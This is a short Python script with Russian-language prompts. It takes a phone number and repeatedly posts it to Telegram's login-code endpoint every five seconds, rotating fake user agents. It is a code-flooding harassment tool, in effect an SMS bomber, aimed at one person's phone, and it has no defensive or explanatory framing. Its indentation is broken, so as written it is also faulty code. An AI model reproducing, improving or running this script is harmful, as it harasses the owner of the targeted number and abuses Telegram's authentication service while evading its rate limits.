import requests, fake_useragent, time

 user = fake_useragent.UserAgent().random
 headers = {'user_agent': user}
NUMBER = input('Ведите номер')

while True:
 user = fake_useragent.UserAgent().random
 headers = {'user_agent': user}
   try:
      response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : NUMBER})
      print('Отправлен')
      except:
        print('Не отправлен')
        
       time.sleep(5)
      
